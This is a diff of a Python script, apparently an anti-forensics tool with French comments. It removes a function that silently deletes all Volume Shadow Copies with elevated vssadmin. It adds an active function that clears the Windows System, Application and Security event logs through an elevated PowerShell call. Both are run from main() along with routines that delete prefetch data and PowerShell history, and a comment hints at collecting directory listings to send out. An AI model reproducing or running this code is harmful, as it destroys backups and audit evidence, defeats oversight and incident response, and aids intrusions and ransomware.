@@ -54,16 +54,6 @@ def delete_prefetch():
 #Il faut etre admin
 
 #os.system('vssadmin List Shadows')
-def vss():
-	
-	try:
-		volume = os.environ['SystemDrive']
-		commande = f'vssadmin delete shadows /for={volume} /all /quiet'
-		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'\"")
-
-	except Exception as e:
-		print(e)
-		pass
 
 
 def powershell_history():
@@ -76,15 +66,19 @@ def powershell_history():
 		print("Le fichier n'existe pas")
 
 
-"""
 def clear_logs():
 	commande = "wevtutil cl system && wevtutil cl application && wevtutil cl security"
-"""
+	try:
+		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'\"")
+	except:
+		pass
+
+
+
 def main():
-	vss()
 	delete_prefetch()
 	powershell_history()
-
+	clear_logs()
 #main()
 #Pour lister les répertoire et les envoyer
 #dir /path/ >> %temp%/nom.txt
